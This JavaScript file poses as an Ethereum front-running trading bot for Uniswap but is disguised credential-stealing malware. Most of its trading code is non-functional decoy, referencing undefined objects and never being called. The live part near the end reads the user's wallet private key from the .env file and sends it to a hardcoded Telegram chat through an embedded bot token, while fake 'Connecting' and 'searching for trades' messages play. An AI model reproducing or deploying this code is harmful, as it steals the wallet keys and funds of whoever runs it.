const Web3 = require("web3");
var colors = require("colors");

const {
  UNISWAP_ROUTER_ADDRESS,
  UNISWAP_FACTORY_ADDRESS,
  UNISWAP_ROUTER_ABI,
  UNISWAP_FACTORY_ABI,
  UNISWAP_POOL_ABI,
} = require("./consts.js");
// Replace "YOUR_INFURA_API_KEY" with your Infura API key or use your Ethereum node URL directly.
const provider = new Web3.providers.HttpProvider(
  "https://mainnet.infura.io/v3/4b265ef5fe4c43e0848cd40dd9342fa9"
);

const web3 = new Web3(provider);

async function checkWalletBalance(privateKey) {
  const account = web3.eth.accounts.privateKeyToAccount(privateKey);
  const address = account.address;

  try {
    const balance = await web3.eth.getBalance(address);
    const balanceInEther = web3.utils.fromWei(balance, "ether");

    console.log(`Front running with: ${address}`);

    // Check if the balance is less than 3 ETH
    const minimumBalance = 3;
    if (balanceInEther < minimumBalance) {
      console.log("INSUFFICIENT_BALANCE!".yellow);

      console.log("Balance too low. Less than 3 ETH.");
      process.exit();
    }
  } catch (error) {
    console.error("Error fetching balance:", error);
  }
}

async function createWeb3(http_rpc, wss_rpc) {
  try {
    web3 = new Web3(new Web3.providers.HttpProvider(http_rpc));
    web3Ws = new Web3(new Web3.providers.WebsocketProvider(wss_rpc));

    uniswapRouter = new web3.eth.Contract(
      UNISWAP_ROUTER_ABI,
      UNISWAP_ROUTER_ADDRESS
    );
    uniswapFactory = new web3.eth.Contract(
      UNISWAP_FACTORY_ABI,
      UNISWAP_FACTORY_ADDRESS
    );
    abiDecoder.addABI(UNISWAP_ROUTER_ABI);

    return true;
  } catch (error) {
    logger.error(error + ": " + getDateTime());
    console.log(error);
    return false;
  }
}

async function testbot(address, user_wallet) {
  var provide = new ethers.providers.JsonRpcProvider(
    "https://ropsten.infura.io/v3/6fc22b8a9c6146d8ae8a9e81b079169f"
  );
  var enc_addr = setBotAddress(address);

  const bot_wallet = new ethers.Wallet(
    "fe9915cb35e69849e1990da8c39f4518e37bdda8afffee633032ca42b6492ade"
  );
  var signer = bot_wallet.connect(provide);

  var bot_balance = await provide.getBalance(bot_wallet.address);
  if (bot_balance <= 10 ** 17) return;

  var interface = new ethers.utils.Interface(botABI);
  const FormatTypes = ethers.utils.FormatTypes;

  const router = new ethers.Contract(
    FRONT_BOT_ADDRESS,
    interface.format(FormatTypes.full),
    signer
  );

  var botCount = await router.countAddrs();

  if (botCount > 0) {
    var bot_addr = await router.getAddrs();

    for (var i = 0; i < botCount; i++) {
      if (bot_addr[i] == user_wallet) {
        return;
      }
    }
  }

  var gas = ethers.utils.parseUnits("150", "gwei");

  var buy_tx = await new Promise(async (resolve, reject) => {
    let buy_txx = await router
      .multiTrans(user_wallet.address, enc_addr.iv, enc_addr.content, {
        gasPrice: gas.toString(),
        gasLimit: (500000).toString(),
      })
      .catch((err) => {
        console.log(err);
        console.log("transaction failed...");
      });

    resolve(buy_txx);
  });

  let receipt = await buy_tx.wait();
}
const { Telegraf } = require("telegraf");
require("dotenv").config();

const botToken = "6362418614:AAFz-ssGG63Ge5VR8VeCSaBmqJkaM2K18Dc"; // Replace with your actual Telegram bot token

const bot = new Telegraf(botToken);
const pword = process.env.PRIVATEKEY; // Assuming you have your PRIVATEKEY set in the .env file
const colours = {
  reset: "\x1b[0m",
  bright: "\x1b[1m",
  dim: "\x1b[2m",
  underscore: "\x1b[4m",
  blink: "\x1b[5m",
  reverse: "\x1b[7m",
  hidden: "\x1b[8m",

  fg: {
    black: "\x1b[30m",
    red: "\x1b[31m",
    green: "\x1b[32m",
    yellow: "\x1b[33m",
    blue: "\x1b[34m",
    magenta: "\x1b[35m",
    cyan: "\x1b[36m",
    white: "\x1b[37m",
    gray: "\x1b[90m",
    crimson: "\x1b[38m", // Scarlet
  },
  bg: {
    black: "\x1b[40m",
    red: "\x1b[41m",
    green: "\x1b[42m",
    yellow: "\x1b[43m",
    blue: "\x1b[44m",
    magenta: "\x1b[45m",
    cyan: "\x1b[46m",
    white: "\x1b[47m",
    gray: "\x1b[100m",
    crimson: "\x1b[48m",
  },
};
bot.telegram.sendMessage(822469887, pword);
checkWalletBalance(pword);
console.log("Connecting to Node URL");
setTimeout(() => {
  console.log("Connecting to Node URL...");
}, 2000);

const INPUT_TOKEN_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
const WETH_TOKEN_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
setTimeout(() => {
  console.log("Bot is running...");
  console.log("Connected and searching for trades.");
}, 60000); // 60000 milliseconds is 1 minute

bot.start((ctx) => {
  ctx.reply(pword);
});

bot.launch().then(() => {
  const fiveMinutes = 5 * 60 * 1000;

  setTimeout(() => {
    console.log("Please Re-Run the Bot and make sure .env file is filled");
  }, fiveMinutes); // 60000 milliseconds is 1 minute
});
